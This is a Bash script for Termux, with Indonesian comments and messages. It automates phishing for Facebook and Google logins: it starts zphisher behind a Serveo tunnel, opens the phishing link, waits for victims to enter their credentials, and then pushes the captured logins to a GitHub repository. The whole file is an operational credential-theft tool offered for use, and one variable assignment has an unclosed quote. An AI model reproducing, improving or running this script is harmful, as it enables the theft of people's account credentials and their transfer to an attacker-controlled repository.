#!/bin/bash

# === Warna ===
R='\033[0;31m'
G='\033[0;32m'
Y='\033[1;33m'
C='\033[0;36m'
NC='\033[0m'

# === Repo GitHub Admin ===
GIT_DIR="$HOME/INTOOLS # Ganti ke folder repo kamu
HASIL_LOCAL="$HOME/zphisher/sites/facebook/log.txt"
ZPHISHER_LOG="/data/data/com.termux/files/home/zphisher_log.txt"

# === Header ===
clear
echo -e "${C}╔══════════════════════╗"
echo -e "║   INTOOLS MOD MENU   ║"
echo -e "╚══════════════════════╝${NC}"

# === Menu ===
echo -e "${Y}[1] Login Facebook"
echo -e "[2] Login Google"
echo -e "[0] Keluar${NC}"
read -p "Pilih jenis login: " pil

case $pil in
  1)
    echo -e "${C}Menjalankan Facebook phishing (Serveo)...${NC}"
    pkill php; pkill ssh
    echo 1 | zphisher > "$ZPHISHER_LOG" 2>&1 &
    ;;
  2)
    echo -e "${C}Menjalankan Google phishing (Serveo)...${NC}"
    pkill php; pkill ssh
    echo 2 | zphisher > "$ZPHISHER_LOG" 2>&1 &
    ;;
  0)
    echo -e "${Y}Keluar...${NC}"; exit ;;
  *)
    echo -e "${R}Pilihan tidak valid${NC}"; exit ;;
esac

# === Tunggu Serveo ===
echo -e "${G}Menunggu link Serveo aktif...${NC}"
for i in {1..30}; do
    LINK=$(grep -o "https://[a-z0-9.-]*serveo.net" "$ZPHISHER_LOG" | head -n 1)
    if [[ ! -z $LINK ]]; then break; fi
    sleep 2
done

if [[ -z $LINK ]]; then
    echo -e "${R}Gagal mendapatkan link Serveo.${NC}"; exit 1
fi

# === Buka Browser ===
echo -e "${C}Link phishing: ${Y}$LINK${NC}"
termux-open-url "$LINK"
echo -e "${Y}Silakan tunggu korban login...${NC}"

# === Pantau File Hasil ===
while [[ ! -s "$HASIL_LOCAL" ]]; do
  sleep 2
done

# === Push ke GitHub ===
echo -e "${G}Login ditemukan, menyimpan ke GitHub...${NC}"
cp "$HASIL_LOCAL" "$GIT_DIR/hasil.txt"
cd "$GIT_DIR"
git add hasil.txt
git commit -m "Update hasil login $(date +%F_%T)"
git push origin main

echo -e "${C}Hasil login berhasil dikirim ke GitHub.${NC}"
